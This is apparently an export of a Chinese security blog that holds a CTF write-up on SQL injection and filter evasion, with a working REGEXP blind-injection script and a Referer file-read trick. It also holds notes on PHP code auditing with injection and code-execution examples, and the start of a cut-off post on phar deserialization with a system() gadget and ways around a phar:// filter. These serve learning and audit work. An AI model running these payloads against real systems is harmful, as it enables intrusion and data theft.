<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"></span><br><span class="line">$check_list = <span class="string">"/into|load_file|0x|outfile|by|substr|base|echo|hex|mid|like|or|char|union|or|select|greatest|%00|_|\'|admin|limit|=_| |in|&lt;|&gt;|-|user|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match($check_list, $_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h1&gt;Hacking first,then login!Username is very special.&lt;/h1&gt;'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match($check_list, $_POST[<span class="string">'passwd'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h1&gt;Hacking first,then login!No easy password.&lt;/h1&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query=<span class="string">"select user from user where user='$_POST[username]' and passwd='$_POST[passwd]'"</span>; </span><br><span class="line">$result = mysql_query($query);</span><br><span class="line">$result = mysql_fetch_array($result);</span><br><span class="line">$passwd = mysql_fetch_array(mysql_query(<span class="string">"select passwd from user where user='admin'"</span>));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'user'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Welcome to CTF Training!Please login as role of admin!&lt;/h1&gt;"</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(($passwd[<span class="string">'passwd'</span>])&amp;&amp;($passwd[<span class="string">'passwd'</span>] === $_POST[<span class="string">'passwd'</span>]))&#123;</span><br><span class="line">    $url = $_SERVER[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line">    $parts = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $parts[<span class="string">'host'</span>] != <span class="string">'localhost'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&lt;h1&gt;The website only can come from localhost!You are not admin!&lt;/h1&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        readfile($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到这一题的sql语句同样是下面这样：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'$_POST[username]'</span> <span class="keyword">and</span> passwd=<span class="string">'$_POST[passwd]'</span></span><br></pre></td></tr></table></figure></p>
<p>只不过过滤了更多的东西，下面思考如果进行绕过：</p>
<ul>
<li><code>or</code>可以用<code>||</code>进行绕过。</li>
<li>用<code>%00</code>绕过注释符<code>#、--</code> 的过滤<br>（虽然<code>%00</code>在过滤列表中，但由于浏览器在传给php过程中会经过一次urldecode()，所以php接收到的并不是<code>%00</code>）</li>
<li>用<code>/**/</code>绕过空格的过滤。</li>
<li>如果我们只需要得到<code>user</code>表下<code>password</code>字段的值，因为是在同一条语句中，所以<code>select</code>等查询语句的过滤对我们没有影响。</li>
<li>反斜杠<code>\</code>没被过滤，思路还是利用转义单引号来构造闭合，然后再在password字段构造盲注语句进行注入。</li>
</ul>
<p>现在就是如何构造盲注语句，常用的<code>=</code>、<code>&gt;</code>、<code>&lt;</code>、<code>like</code>等逻辑运算都被过滤掉了，这时候就需要用到<strong>REGEXP正则注入</strong>。</p>
<p>在MySQL中除了可以使用<code>LIKE ..%</code>进行模糊匹配，同样也支持正则表达式的匹配，其使用REGEXP 操作符来进行正则表达式匹配。</p>
<p>正则表达式的规则就类似于PHP 或 Perl，下表中的正则模式可应用于 REGEXP 操作符中：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324163932212.png" alt="在这里插入图片描述"></p>
<p>查找以<code>Le</code>开头的用户名：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324164129885.png" alt="在这里插入图片描述"><br>查找以<code>ck</code>结尾的用户名：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324164214148.png" alt="在这里插入图片描述"></p>
<p>回到题目中来，我们尝试将按照题目的sql逻辑构造如下语句：、<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324165523166.png" alt="在这里插入图片描述"><br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/2020032416551141.png" alt="在这里插入图片描述"></p>
<p>发现是能够进行真假判断的，如果第一个字母猜对了，我们只需要接着判断前两位的开头是否正确即可，然后以此类推，直到猜出全部字段的值：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324165816134.png" alt="在这里插入图片描述"><br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324165707158.png" alt="在这里插入图片描述"></p>
<p>在题目中进行一下验证，利用Intruder模块爆破一下：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324171234331.png" alt="在这里插入图片描述"><br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324171154210.png" alt="在这里插入图片描述"><br>可以看到在以<code>d</code>和<code>D</code>开头时都返回了真，是因为使用regexp正则匹配时是不区分大小写，通常来说只需要加上<code>binary</code>即可解决这个问题，如<code>||binart/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>，但是这一题过滤了<code>in</code>，所以目前我还没有想到好的方法进行大小写匹配。</p>
<p>但实际上这一题的密码都是由小写组成的，否则就只能去遍历所有情况进行爆破了。</p>
<p>最终的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">"http://47.102.127.194:8801/check.php"</span></span><br><span class="line"></span><br><span class="line">str = <span class="string">'1234567890qwertyuiopasdfghjklzxcvbnm'</span></span><br><span class="line">temp = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        temp = flag</span><br><span class="line">        temp += j</span><br><span class="line">        <span class="comment">#注意%00要用\00表示</span></span><br><span class="line">        payload = <span class="string">f"||passwd/**/regexp/**/\"^<span class="subst">&#123;temp&#125;</span>\";\00"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"\\"</span>,</span><br><span class="line">            <span class="string">"passwd"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = s.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"CTF Training"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = temp</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>运行脚本得到密码：d0itr1ght<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324173653172.png" alt="在这里插入图片描述"><br>得到密码后，后面的就比较简单了，<code>admin</code>用<code>adm/**/in</code>绕过，然后用Referer利用<code>file://localhost/..</code>伪造本地读文件即可:<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324174710574.png" alt="在这里插入图片描述"><br>源码中得到flag：<br><img src="/2020/03/24/bypass-apostrophe-ctf-sqli-learn/20200324174734206.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计入门读书小结</title>
    <url>/2019/06/05/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E8%AF%BB%E4%B9%A6%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>由于看到不少讲web安全的地方都会推荐一本书叫 <strong>《代码审计：企业级web代码安全架构》</strong>，于是从图书馆找来这本书读了一下，虽然有些内容可能有点老了，但整体上还是挺不错的，下面做一点总结。</p>
<h4 id="一、通用代码审计思路"><a href="#一、通用代码审计思路" class="headerlink" title="一、通用代码审计思路"></a>一、通用代码审计思路</h4><p>常见的代码审计思路有以下四种：</p>
<p><strong>1、根据敏感关键词（敏感函数）回溯参数传递过程。</strong></p>
<p><strong>2、查找可控变量，正向追踪变量传递过程。</strong></p>
<p><strong>3、寻找敏感功能点，通读功能点代码。</strong><br>（1）文件上传功能：文件上传漏洞、文件名SQL注入漏洞<br>（2）文件管理功能：任意文件操作漏洞、XSS漏洞<br>（3）登陆认证功能：任意用户登陆漏洞、越权漏洞<br>（4）找回密码功能</p>
<p><strong>4、直接通读全文代码</strong></p>
<p>  通读全文代码时，首先应看程序的代码结构，如主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件，除了关注有哪些文件，还要注意文件的大小、创建时间。在看程序目录结构时候，注意以下几个文件：<br>  （1）<strong>函数集文件</strong>：通常命名中包含<code>functions</code>或者<code>common</code>等关键字，一般可以在index.php或者一些功能性文件的头部可以找到。<br>  （2）<strong>配置文件</strong>：通常命名中包含<code>config</code>关键字，配置文件包括web程序运行必须的功能性配置选项以及数据库等配置信息。<br>  （3）<strong>安全过滤文件</strong>：通常文件名中包含<code>filter</code>、<code>safe</code>、<code>check</code>等关键字，这类文件主要是对参数进行过滤，关系到我们找到的可疑点能否利用。<br>  （4）<strong>index文件</strong>：index是一个程序的入口文件，通常读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件，其中核心文件有哪些。</p>
<p><br></p>
<h4 id="二、SQL注入漏洞"><a href="#二、SQL注入漏洞" class="headerlink" title="二、SQL注入漏洞"></a>二、SQL注入漏洞</h4><p>1.<strong>普通注入</strong>：int型和string型</p>
<p>2.<strong>编码注入</strong>：宽字节注入和二次urldecode注入</p>
<p>（1）宽字节注入：<br>当php连接mysql时如果 <code>set character_set_client =gbk</code>时会导致该注入的发生。提交</p>
<pre><code>`/1.php?id= -1&apos; and 1=1%23`
</code></pre><p>时，单引号会被<code>\</code>转义.<br>这时如果提交<code>?id=-1%df&#39; and 1=1#</code>的话，过滤用的<code>\ (%5c)</code>会与<code>%df%5c</code>组合，mysql语句就成了</p>
<pre><code>select * from user where id=&apos;-1運&apos; and 1=1#`
</code></pre><p>（2）urldecode二次解码<br>在web中通常使用<code>addslashes()</code>、<code>mysql_real_escape_string()</code>、<code>mysql_escape_string</code>函数或者开启GPC的方式来防止注入，原理就是给预定义字符也就是单引号、双引号、反斜杠和NULL进行转义，但是如果某处使用了<code>urldecode</code>或者<code>rawurldecode</code>函数，如果开启了GPC来过滤，那么提交<code>?id=1%25%27</code>,<code>%25</code>经过url解码为<code>%</code>，<code>%27</code>解码为<code>单引号</code>，那么成功引发注入，在代码审计的过程中要注意这两个函数。</p>
<p>3.<strong>防护</strong></p>
<p>（1）魔术引号 gpc/rutime<br>在数据处理中主要有两条路线，一种是用户主动提交的，另外一种是用户被动接受的，<br>GPC主要对用户的POST、GET、cookie的值进行过滤，runtimer对从数据库或者文件中获取的数据进行过滤，但是对Int类型注入作用不大。</p>
<p>（2）过滤函数<br>addslashes与GPC的作用差不多。</p>
<p>mysql_real_esca## 二、SQL注入漏洞pe_string()、mysql_escape_string()：主要对字符串进行过滤。</p>
<p>intval()、floatval()等：这类是将string类型转化为int类型的函数，将 <code>1&#39; union select</code>强制转化为1,</p>
<p><br></p>
<h4 id="三、XSS漏洞"><a href="#三、XSS漏洞" class="headerlink" title="三、XSS漏洞"></a>三、XSS漏洞</h4><p>推荐书籍：《XSS跨站脚本攻击剖析与防御》、《Web前端黑客技术揭秘》</p>
<p>1.<strong>分类</strong></p>
<p>（1）反射型XSS<br>（2）存储型XSS</p>
<p>2.<strong>防御</strong></p>
<p>过滤掉特殊字符即可：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>尖括号（&lt;&gt;）</li>
<li>反斜杠（\）</li>
<li>冒号（:）</li>
<li>and符（&amp;）</li>
<li>#号（#）</li>
</ul>
<p><br></p>
<h4 id="四、CSRF漏洞"><a href="#四、CSRF漏洞" class="headerlink" title="四、CSRF漏洞"></a>四、CSRF漏洞</h4><p>1.<strong>判断方法</strong></p>
<p>（1）黑盒<br>在挖掘CSRF的时候可以先搭建好环境，打开几个有非静态操作的页面，抓包看看有没有token，如果没有token的话，在直接请求这个页面，不带referer。如果返回的数据还是一样的，那说明有可能有CSRF漏洞。<br>  （2）白盒<br>看看几个核心文件里面有没有验证token和referer相关的代码。  </p>
<p>2.<strong>防御</strong></p>
<p>（1）Token验证<br>（2）验证码验证</p>
<p><br></p>
<h4 id="五、文件操作漏洞"><a href="#五、文件操作漏洞" class="headerlink" title="五、文件操作漏洞"></a>五、文件操作漏洞</h4><p>1.<strong>文件包含漏洞</strong></p>
<p>文件包含函数: </p>
<ul>
<li>include()</li>
<li>include_once()</li>
<li>require()</li>
<li>require_once()</li>
</ul>
<p>2.<strong>文件读取(下载漏洞)</strong></p>
<p>文件读取函数：</p>
<ul>
<li>file_get_contents()</li>
<li>highlight_file()</li>
<li>fopen()</li>
<li>readfile()</li>
<li>fread()</li>
<li>fgetss()</li>
<li>fgets()</li>
<li>parse_ini_file()</li>
<li>show_source()</li>
<li>file()</li>
<li>文件包含函数include以及php输入输出流php://filter</li>
</ul>
<p>3.<strong>文件上传漏洞</strong></p>
<ul>
<li>对文件名或扩展名未过滤或过滤不全</li>
<li>黑名单存在绕过</li>
<li>文件头、content-type验证绕过</li>
<li>解析漏洞</li>
</ul>
<p>4.<strong>文件删除漏洞</strong></p>
<p>文件删除函数：</p>
<ul>
<li>unlink()</li>
<li>老版本下session_destroy()</li>
</ul>
<p>5.<strong>防御</strong></p>
<p>（1）对文件操作的权限管理要合理<br>（2）有些文件不需要直接传入文件名<br>（3）过滤掉文件跳转的一些符号<br>（4）文件上传尽量使用白名单过滤扩展名，保存上传的文件时利用时间戳+随机数MD5重命名</p>
<p><br></p>
<h4 id="六、代码执行漏洞"><a href="#六、代码执行漏洞" class="headerlink" title="六、代码执行漏洞"></a>六、代码执行漏洞</h4><p>1.<strong>常见函数</strong></p>
<ul>
<li>eval()</li>
<li>assert()</li>
<li>preg_replace()</li>
<li>call_user_func()</li>
<li>call_user_func_array()</li>
<li>array_map()</li>
</ul>
<p>（1）eval 和 assert 函数</p>
<p>动态执行代码，参数直接就是php代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">'aaa'</span>;</span><br><span class="line">$b=<span class="string">'bbb'</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'$a=$b;'</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果输出: bbb</span><br></pre></td></tr></table></figure>
<p>（2）preg_replace函数<br>该函数作用是对字符串进行正则处理，它的参数和返回如下：<br><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit=-1 [, int &amp;$count ] ] )</code><br>这段代码的含义是搜索<code>$subject</code>中匹配<code>$pattern</code>的部分，以<code>$replacement</code>进行代替，而当<code>$pattern</code>处即第一个参数存在e修饰符时，<code>$replacement</code>的值会被当作PHP代码来执行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">"/\[(.*)\]/e"</span>, <span class="string">'\\1'</span>, $_GET[<span class="string">'str'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">当传入?str=[phpinfo()]</span><br><span class="line">代码执行成功，回显phpinfo页面</span><br></pre></td></tr></table></figure>
<p>（3）调用函数过滤不严<br>call_user_fun()和araay_map()等函数有调用其他函数的功能，其中一个参数作为要调用的函数名，如果这个传入的函数名可控， 就可以调用意外的函数来执行代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b=<span class="string">'phpinfo()'</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>], $b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">当请求?a=assert时候，调用了assert函数，并将phpinfo()作为参数传入，执行了该代码。</span><br></pre></td></tr></table></figure>
<p>（4）动态函数执行<br>php动态函数的写法为“变量(参数)”，如下例：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'a'</span>]($GET_[<span class="string">'b'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">上述代码意思时a的参数作为函数，b的参数作为函数的参数</span><br><span class="line">即当传入?a=assert&amp;b=phpinfo()时，相当于执行assert(<span class="string">'phpinfo()'</span>)</span><br></pre></td></tr></table></figure></p>
<p>2.<strong>防御</strong></p>
<p>采用白名单过滤，或者结合正则表达式来进行白名单限制。</p>
<p><br></p>
<h4 id="七、命令执行漏洞"><a href="#七、命令执行漏洞" class="headerlink" title="七、命令执行漏洞"></a>七、命令执行漏洞</h4><p>1.<strong>命令执行函数：</strong></p>
<ul>
<li>system()</li>
<li>exec()</li>
<li>shell_exec()</li>
<li>passthru()</li>
<li>pcntl_exec()</li>
<li>popen()</li>
<li>proc_open()</li>
<li>反引号（`），相当于调用shell_exec()</li>
</ul>
<p>（1）system()、exec()、shell_exec()、passthru()以及反引号(`)可以直接传入命令并且函数会返回执行结果，其中system()函数会直接回显打印输出，不需要ehco也可以。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'whoami'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果输出当前的WebServer用户</span><br></pre></td></tr></table></figure></p>
<p>（2）popen()、proc_open()不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行了。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">popen(<span class="string">'whoami &gt;&gt;D://2.txt'</span>, <span class="string">'r'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">执行完可以在D盘根目录看到<span class="number">2.</span>txt这个文件，内容为WebServer用户名</span><br></pre></td></tr></table></figure></p>
<p>2.<strong>防御</strong></p>
<p>（1）命令防注入函数</p>
<ul>
<li>escapeshellcmd() 过滤整体命令，参数是一整条命令</li>
<li>escapeshellarg() 过滤参数，将参数限制在一对双引号里，确保参数为一个字符串，因此它会把双引号替换为空格</li>
</ul>
<p><br></p>
<h4 id="八、变量覆盖漏洞"><a href="#八、变量覆盖漏洞" class="headerlink" title="八、变量覆盖漏洞"></a>八、变量覆盖漏洞</h4><p>1.<strong>引发函数：</strong></p>
<ul>
<li>extract()</li>
<li>parse_str()</li>
<li>import_request_variables()</li>
</ul>
<p>（1）extract 函数<br>简单来说就是将数组中的键值对注册成变量。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b=<span class="number">3</span>;</span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">'b'</span>=&gt;<span class="string">'1'</span>);</span><br><span class="line">extract($a);</span><br><span class="line">print_r($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果输出：<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>原本变量<code>$b</code>的值为3，经过extract()函数对变量<code>$a</code>处理后，变量<code>$b</code>的值被覆盖为1。</p>
<p>（2）parse_str 函数<br>parse_str()函数作用是解析字符串并注册成变量，它在注册变量之前不会验证当前变量是否已经存在，所以会覆盖掉已有变量。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b=<span class="number">1</span>;</span><br><span class="line">parse_str(<span class="string">'b=2'</span>);</span><br><span class="line">print_r($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果输出：<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p>（3）import_request_variables 函数<br>import_request_variables()函数是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候，需要PHP4.1至5.4之间的版本。</p>
<p>（4）\$\$ 变量覆盖</p>
<p>2.<strong>防御</strong><br>（1）使用原始变量<br>（2）验证变量存在</p>
<p><br></p>
<h4 id="九、逻辑处理漏洞"><a href="#九、逻辑处理漏洞" class="headerlink" title="九、逻辑处理漏洞"></a>九、逻辑处理漏洞</h4><p>1.<strong>等于与存在判断绕过</strong><br>（1）in_array()函数<br>（2）is_numeric函数<br>（3）双等于（==）和三等于（ ===）</p>
<p>2.<strong>账户体系中的越权漏洞</strong></p>
<p>3.<strong>未 exit 或 return 引发的安全问题</strong></p>
<p>4.<strong>常见支付漏洞</strong></p>
<p>5.<strong>防御</strong><br>（1）深入熟悉业务逻辑<br>（2）熟悉函数的功能和差异</p>
<p><br></p>
<h4 id="十、会话认证漏洞"><a href="#十、会话认证漏洞" class="headerlink" title="十、会话认证漏洞"></a>十、会话认证漏洞</h4><p>1.<strong>cookie认证安全</strong><br>（1）cookie的SQL注入<br>（2）伪造cookie</p>
<p>2.<strong>防御</strong><br>（1）严格限制输入的异常字符已经避免用客户端提交的内容直接操作<br>（2）将cookie与session结合起来使用，并保证客户端不能操作敏感session参数<br>（3）敏感数据不要放在cookie中</p>
<p><br></p>
<h4 id="十一、二次漏洞"><a href="#十一、二次漏洞" class="headerlink" title="十一、二次漏洞"></a>十一、二次漏洞</h4><p>1.<strong>什么是二次漏洞</strong><br>需要先构造好利用代码写入网站保存，在第二次或多次请求后调用攻击代码触发或者修改配置触发的漏洞叫做而此漏洞。</p>
<p>（此漏洞较复杂，需之后进一步学习研究）</p>
]]></content>
      <categories>
        <category>Reading Notes</category>
      </categories>
      <tags>
        <tag>Code Audit</tag>
      </tags>
  </entry>
  <entry>
    <title>phar反序列化小结</title>
    <url>/2019/11/13/phar-unserialize/</url>
    <content><![CDATA[<h1 id="0x00-phar反序列化"><a href="#0x00-phar反序列化" class="headerlink" title="0x00  phar反序列化"></a>0x00  phar反序列化</h1><p>phar反序列化即在文件系统函数（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合<code>phar://伪协议</code>，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p>
<p>关于其他反序列化的总结，可以看我的<a href="https://lethe.site/2019/08/06/%E8%B0%88%E4%B8%80%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">这篇文章</a><br><br></p>
<h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h1><p>首先了解一下phar文件的结构，一个phar文件由四部分构成：</p>
<ul>
<li><p>a <strong>stub</strong>：可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
</li>
<li><p>a <strong>manifest</strong> describing the contents：phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的<strong>meta-data</strong>，这是上述攻击手法最核心的地方。</p>
<p><img src="/2019/11/13/phar-unserialize/20190918175817516.png" alt="在这里插入图片描述"></p>
</li>
<li><p>the file <strong>contents</strong>：被压缩文件的内容。</p>
</li>
<li><p>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)：签名，放在文件末尾</p>
</li>
</ul>
<p><br></p>
<h1 id="0x02-demo"><a href="#0x02-demo" class="headerlink" title="0x02 demo"></a>0x02 demo</h1><p>注意：如果想要生成Phar文件，要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成<code>phar</code>文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;&#125;</span><br><span class="line">    $o = <span class="keyword">new</span> Test();</span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到meta-data是以序列化的形式存储的：</p>
<p><img src="/2019/11/13/phar-unserialize/20190918182831137.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="0x03-影响的函数"><a href="#0x03-影响的函数" class="headerlink" title="0x03 影响的函数"></a>0x03 影响的函数</h1><p>知道创宇的seaii 更为我们指出了所有文件函数均可使用：</p>
<p><img src="/2019/11/13/phar-unserialize/20190918183243195.png" alt="在这里插入图片描述"></p>
<p>但实际上只要调用了<code>php_stream_open_wrapper</code>的函数，都存在这样的问题。</p>
<p>因此还有如下函数：</p>
<p><strong>exif</strong></p>
<ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
</ul>
<p><strong>gd</strong></p>
<ul>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom</code></li>
</ul>
<p><strong>hash</strong></p>
<ul>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
</ul>
<p><strong>file / url</strong></p>
<ul>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
<li><code>mime_content_type</code></li>
</ul>
<p><strong>standard</strong></p>
<ul>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
<p><strong>finfo</strong></p>
<ul>
<li><code>finfo_file</code></li>
<li><code>finfo_buffer</code></li>
</ul>
<p><strong>zip</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="string">'c.zip'</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="string">'phar://test.phar/test'</span>);</span><br></pre></td></tr></table></figure></p>
<p><strong>Postgres</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(sprintf(<span class="string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span>, <span class="string">"127.0.0.1"</span>, <span class="string">"postgres"</span>, <span class="string">"sx"</span>, <span class="string">"123456"</span>));</span><br><span class="line">@$pdo-&gt;pgsqlCopyFromFile(<span class="string">'aa'</span>, <span class="string">'phar://test.phar/aa'</span>);</span><br></pre></td></tr></table></figure>
<p><strong>MySQL</strong></p>
<p><code>LOAD DATA LOCAL INFILE</code>也会触发这个<code>php_stream_open_wrapper</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $s = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="keyword">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'123456'</span>, <span class="string">'easyweb'</span>, <span class="number">3306</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;'</span>);</span><br></pre></td></tr></table></figure>
<p>再配置一下mysqld。（非默认配置）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">local-infile=<span class="number">1</span></span><br><span class="line">secure_file_priv=<span class="string">""</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h1 id="0x04-Trick"><a href="#0x04-Trick" class="headerlink" title="0x04 Trick"></a>0x04 Trick</h1><p>（1）如果过滤了<code>phar://</code>协议怎么办呢？</p>
<p>有以下几种方法可以绕过：</p>
<ul>
<li><p><code>compress.bzip2://phar://</code></p>
</li>
<li><p><code>compress.zlib://phar:///</code></p>
</li>
<li><p><code>php://filter/resource=phar://</code></p>
